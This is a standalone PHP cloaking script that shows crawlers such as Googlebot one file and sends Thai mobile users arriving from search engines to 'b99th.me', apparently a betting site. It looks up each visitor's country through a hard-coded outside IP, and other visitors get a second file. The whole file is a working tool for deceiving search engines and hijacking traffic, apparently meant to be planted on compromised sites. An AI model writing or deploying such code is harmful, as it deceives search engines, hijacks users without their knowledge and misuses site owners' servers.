<?php

$target = "https://b99th.me/"; # target redirect
$country = "TH";

function isMobile(){
    return preg_match(
        "/mobile|android|iphone|ipad|ipod|opera mini|blackberry|webos|iemobile|windows phone|kindle|silk/i",
        strtolower($_SERVER["HTTP_USER_AGENT"])
    );
}


function getVisitorIP() {
    $ipKeys = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER)) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

$referer = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";
$user_agent = isset($_SERVER["HTTP_USER_AGENT"])
    ? strtolower($_SERVER["HTTP_USER_AGENT"])
    : "";

$bunvisEngine = [
    "googlebot",
    "bingbot",
    "slurp",
    "baiduspider",
    "duckduckbot",
    "yandexbot",
    "ask.com",
    "aol",
    "naverbot",
    "sogou",
    "exalead",
    "goo",
    "qwant",
    "mojeekbot",
    "yippybot",
    "gigablast",
    "lycos",
    "webcrawler",
    "metacrawler",
    "infoseek",
    "wolframalpha",
    "teoma",
    "dogpile",
    "alltheweb",
    "mamma",
    "excite",
    "yahooligans",
    "search.com",
    "ask jeeves",
    "gosh",
    "blekko",
    "webring",
    "metager",
    "searx",
    "startpage",
    "freenom",
    "searchencrypt",
    "findthatfile",
    "trove",
    "kiddle",
];

function getCountryCode() {
    $visitorIP = getVisitorIP();
    $apiUrl = "http://151.240.0.3/ip.php?ip=" . urlencode($visitorIP);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpCode == 200 && $response) {
        $countryCode = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            $countryCode = trim($response);
            $countryCode = str_replace(['"', "'"], '', $countryCode);
        }
        
        return strtoupper($countryCode);
    }
    
    return null;
}

function sebFungsi($user_agent, $bunvisEngine)
{
    foreach ($bunvisEngine as $bunvisBe) {
        if (strpos($user_agent, $bunvisBe) !== false) {
            return true;
        }
    }
    return false;
}

if (sebFungsi($user_agent, $bunvisEngine)) {
    include "readme.txt";
} else {
    if (
        strpos($referer, "google.com") !== false ||
        strpos($referer, "bing.com") !== false ||
        strpos($referer, "yahoo.com") !== false ||
        strpos($referer, "baidu.com") !== false ||
        strpos($referer, "duckduckgo.com") !== false ||
        strpos($referer, "yandex.com") !== false ||
        strpos($referer, "ask.com") !== false ||
        strpos($referer, "aol.com") !== false ||
        strpos($referer, "naver.com") !== false ||
        strpos($referer, "sogou.com") !== false ||
        strpos($referer, "exalead.com") !== false ||
        strpos($referer, "goo.ne.jp") !== false ||
        strpos($referer, "qwant.com") !== false ||
        strpos($referer, "mojeek.com") !== false ||
        strpos($referer, "yippy.com") !== false ||
        strpos($referer, "gigablast.com") !== false ||
        strpos($referer, "lycos.com") !== false ||
        strpos($referer, "webcrawler.com") !== false ||
        strpos($referer, "metacrawler.com") !== false ||
        strpos($referer, "infoseek.com") !== false ||
        strpos($referer, "wolframalpha.com") !== false ||
        strpos($referer, "teoma.com") !== false ||
        strpos($referer, "dogpile.com") !== false ||
        strpos($referer, "alltheweb.com") !== false ||
        strpos($referer, "mamma.com") !== false ||
        strpos($referer, "excite.com") !== false ||
        strpos($referer, "yahooligans.com") !== false ||
        strpos($referer, "search.com") !== false ||
        strpos($referer, "askjeeves.com") !== false ||
        strpos($referer, "gosh.com") !== false ||
        strpos($referer, "blekko.com") !== false ||
        strpos($referer, "webring.com") !== false ||
        strpos($referer, "metager.com") !== false ||
        strpos($referer, "searx.com") !== false ||
        strpos($referer, "startpage.com") !== false ||
        strpos($referer, "freenom.com") !== false ||
        strpos($referer, "searchencrypt.com") !== false ||
        strpos($referer, "findthatfile.com") !== false ||
        strpos($referer, "trove.com") !== false ||
        strpos($referer, "kiddle.com") !== false
    ) {
        if (isMobile()) {
            $userCountry = getCountryCode();
            
            if ($userCountry === $country) {
                include "readme.txt";
                echo "
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <meta http-equiv=\"refresh\" content=\"0.5; url=$target\">
                    </head>
                    <body>
                    </body>
                    </html>
                ";
            } else {
                include "version.txt";
            }
        } else {
            include "version.txt";
        }
    } else {
        include "version.txt";
    }
}

?>